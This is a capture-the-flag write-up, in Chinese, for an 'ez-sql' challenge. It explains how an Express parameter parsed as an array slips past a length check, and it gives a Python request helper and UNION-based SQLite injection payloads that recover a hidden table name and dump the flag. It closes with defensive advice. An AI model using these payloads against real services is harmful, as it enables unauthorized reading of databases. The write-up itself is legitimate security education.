# ez-sql

## 题目简述

`/search` 把查询参数 `name` 直接拼进 SQLite `LIKE`，但先检查 `name.length <= 6`。Express 的嵌套查询参数可以把 `name` 解析成数组；数组长度只有 1，进入模板字符串时又会被 JavaScript 自动转换为其中的长字符串，从而绕过长度限制并注入 SQL。

## 解题过程

用 `name[0]` 发送 payload：

```python
import requests

base = "https://TARGET"

def inject(payload: str) -> str:
    return requests.get(
        base + "/search", params={"name[0]": payload}, timeout=10
    ).text
```

服务端看到的是长度为 1 的数组，因此检查通过；拼接时数组被强制转换成 payload 文本。先从 `sqlite_master` 取随机 UUID 表名：

```sql
x' UNION SELECT 1, sql FROM sqlite_master WHERE type='table'--
```

返回的建表语句形如 `CREATE TABLE flag_<uuid> (flag TEXT)`。取得表名后再查询：

```sql
x' UNION SELECT 1, flag FROM flag_<uuid>--
```

响应给出：

```text
tjctf{ezpz_l3mon_squ33zy_603f8e08}
```

## 方法总结

- JavaScript 中数组既有自己的短 `.length`，又会在字符串上下文中调用 `toString()`；这是典型的类型/视图差异。
- 随机表名不是可靠保护，SQL 注入者可以查询 SQLite 元数据恢复 schema。
- 参数长度检查不能防 SQLi；应拒绝非字符串类型，并始终使用参数化查询。
